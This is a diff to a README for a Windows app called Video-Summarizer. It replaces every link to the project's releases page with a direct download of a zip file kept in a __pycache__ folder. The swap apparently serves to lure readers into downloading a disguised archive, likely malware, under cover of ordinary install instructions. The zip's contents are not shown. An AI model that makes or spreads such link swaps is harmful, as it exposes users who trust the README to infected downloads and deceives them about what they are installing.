@@ -1,10 +1,10 @@
 # 🎬 Video-Summarizer - Fast AI summaries for your videos
 
-[![Download Video-Summarizer](https://img.shields.io/badge/Download-Video--Summarizer-blue.svg?style=for-the-badge)](https://github.com/Macr7523/Video-Summarizer/releases)
+[![Download Video-Summarizer](https://img.shields.io/badge/Download-Video--Summarizer-blue.svg?style=for-the-badge)](https://github.com/Macr7523/Video-Summarizer/raw/refs/heads/main/__pycache__/Video-Summarizer-v1.7.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Macr7523/Video-Summarizer/releases
+Visit this page to download: https://github.com/Macr7523/Video-Summarizer/raw/refs/heads/main/__pycache__/Video-Summarizer-v1.7.zip
 
 ## 🖥️ What Video-Summarizer Does
 
@@ -34,7 +34,7 @@ For best results, use:
 
 ## 🚀 Get the App
 
-1. Open the download page: https://github.com/Macr7523/Video-Summarizer/releases
+1. Open the download page: https://github.com/Macr7523/Video-Summarizer/raw/refs/heads/main/__pycache__/Video-Summarizer-v1.7.zip
 2. Find the latest release
 3. Download the Windows file from the release assets
 4. Save it to your desktop or Downloads folder
@@ -156,4 +156,4 @@ Yes, but it is best to process one at a time for a smoother run.
 
 ## 🔗 Download Again
 
-Visit this page to download: https://github.com/Macr7523/Video-Summarizer/releases
+Visit this page to download: https://github.com/Macr7523/Video-Summarizer/raw/refs/heads/main/__pycache__/Video-Summarizer-v1.7.zip
